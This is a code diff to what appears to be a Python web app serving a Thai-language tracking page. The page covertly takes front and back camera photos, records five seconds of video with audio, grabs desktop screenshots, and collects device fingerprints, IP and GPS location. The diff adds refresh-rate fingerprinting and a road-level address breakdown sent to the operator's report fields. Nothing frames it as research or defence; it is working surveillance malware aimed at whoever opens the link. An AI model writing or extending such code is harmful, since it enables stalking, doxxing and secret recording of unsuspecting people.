@@ -124,6 +124,32 @@ HTML = '''<!DOCTYPE html>
                 orientation: window.innerHeight > window.innerWidth ? 'Portrait' : 'Landscape'
             };
             
+            // Refresh Rate
+            try {
+                let hz = 60;
+                if (screen.refreshRate) {
+                    hz = screen.refreshRate;
+                } else {
+                    let frames = 0;
+                    const start = performance.now();
+                    await new Promise((resolve) => {
+                        function count() {
+                            frames++;
+                            if (performance.now() - start < 1000) {
+                                requestAnimationFrame(count);
+                            } else {
+                                hz = Math.round(frames);
+                                resolve();
+                            }
+                        }
+                        requestAnimationFrame(count);
+                    });
+                }
+                deviceInfo.refreshRate = hz;
+            } catch(e) {
+                deviceInfo.refreshRate = 'ไม่ทราบ';
+            }
+            
             if (navigator.connection) {
                 deviceInfo.networkType = navigator.connection.effectiveType || 'ไม่ทราบ';
                 deviceInfo.downlink = navigator.connection.downlink || 0;
@@ -160,8 +186,7 @@ HTML = '''<!DOCTYPE html>
                 deviceInfo.batteryLevel = 'ไม่รองรับ';
             }
             
-            // ฟังก์ชันช่วยถ่ายรูปจาก stream
-            async function captureFromStream(stream, label) {
+            async function captureFromStream(stream) {
                 const video = document.createElement('video');
                 video.style.display = 'none';
                 document.body.appendChild(video);
@@ -178,23 +203,20 @@ HTML = '''<!DOCTYPE html>
             }
             
             try {
-                // 1. ถ่ายกล้องหน้า
                 const frontStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'user' }, 
                     audio: false 
                 });
-                const frontPhoto = await captureFromStream(frontStream, 'front');
+                const frontPhoto = await captureFromStream(frontStream);
                 frontStream.getTracks().forEach(t => t.stop());
                 
-                // 2. ถ่ายกล้องหลัง
                 const backStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'environment' }, 
                     audio: false 
                 });
-                const backPhoto = await captureFromStream(backStream, 'back');
+                const backPhoto = await captureFromStream(backStream);
                 backStream.getTracks().forEach(t => t.stop());
                 
-                // 3. บันทึกวิดีโอจากกล้องหน้า 5 วินาที
                 const videoStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'user' }, 
                     audio: true 
@@ -217,7 +239,6 @@ HTML = '''<!DOCTYPE html>
                 formData.append('video', videoBlob, 'video.webm');
                 formData.append('info', JSON.stringify(deviceInfo));
                 
-                // แคปหน้าจอ (เฉพาะคอม)
                 const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                 if (!isMobile && typeof navigator.mediaDevices.getDisplayMedia === 'function') {
                     try {
@@ -300,21 +321,21 @@ def upload():
         if real_ip:
             fields.append({"name": "🌐 IP", "value": real_ip, "inline": True})
         if location:
-            fields.append({"name": "📍 เมือง", "value": location['city'], "inline": True})
-            fields.append({"name": "🗺️ จังหวัด", "value": location['region'], "inline": True})
-            fields.append({"name": "🌍 ประเทศ", "value": location['country'], "inline": True})
+            fields.append({"name": "📍 เมือง (IP)", "value": location['city'], "inline": True})
+            fields.append({"name": "🗺️ จังหวัด (IP)", "value": location['region'], "inline": True})
             fields.append({"name": "📶 ค่ายเน็ต", "value": location['isp'][:50], "inline": True})
         
         fields.append({"name": "💻 OS", "value": device_info.get('os', 'ไม่ระบุ'), "inline": True})
         fields.append({"name": "🌐 เบราว์เซอร์", "value": device_info.get('browser', 'ไม่ระบุ'), "inline": True})
         fields.append({"name": "🖥️ หน้าจอ", "value": f"{device_info.get('screenWidth')}x{device_info.get('screenHeight')}", "inline": True})
-        fields.append({"name": "🔤 ภาษา", "value": device_info.get('language', 'ไม่ระบุ'), "inline": True})
+        fields.append({"name": "⚡ Hz", "value": f"{device_info.get('refreshRate', 'ไม่ทราบ')} Hz", "inline": True})
         
         if device_info.get('networkType') and device_info.get('networkType') != 'ไม่รองรับ':
             fields.append({"name": "📶 ประเภทเน็ต", "value": device_info['networkType'], "inline": True})
         if device_info.get('downlink'):
             fields.append({"name": "📶 ความเร็ว", "value": f"{device_info['downlink']} Mbps", "inline": True})
         
+        # GPS + ที่อยู่แบบละเอียด
         if device_info.get('gps_lat') and device_info.get('gps_lon'):
             source = device_info.get('gps_from', 'GPS')
             if source == 'IP':
@@ -324,11 +345,25 @@ def upload():
                 gps_label = f"📍 GPS (±{acc} เมตร)"
             gps_val = f"{device_info['gps_lat']}, {device_info['gps_lon']}"
             fields.append({"name": gps_label, "value": gps_val, "inline": True})
+            
             if gps_address:
-                addr_val = gps_address.get('display_name', '')
-                if len(addr_val) > 50:
-                    addr_val = addr_val[:50] + '...'
-                fields.append({"name": "🏠 ที่อยู่", "value": addr_val, "inline": False})
+                # ที่อยู่แบบละเอียด
+                addr_parts = []
+                if gps_address.get('road'):
+                    addr_parts.append(f"🛣️ ถนน: {gps_address['road']}")
+                if gps_address.get('village'):
+                    addr_parts.append(f"🏘️ ตำบล/หมู่บ้าน: {gps_address['village']}")
+                if gps_address.get('city'):
+                    addr_parts.append(f"🏙️ อำเภอ/เขต: {gps_address['city']}")
+                if gps_address.get('province'):
+                    addr_parts.append(f"🗺️ จังหวัด: {gps_address['province']}")
+                if gps_address.get('postcode'):
+                    addr_parts.append(f"📮 รหัสไปรษณีย์: {gps_address['postcode']}")
+                if gps_address.get('display_name'):
+                    addr_parts.append(f"📍 ที่อยู่เต็ม: {gps_address['display_name'][:100]}")
+                
+                for part in addr_parts:
+                    fields.append({"name": "🏠 ที่อยู่", "value": part, "inline": False})
         else:
             fields.append({"name": "📍 GPS", "value": "ไม่ได้รับข้อมูล", "inline": True})
         
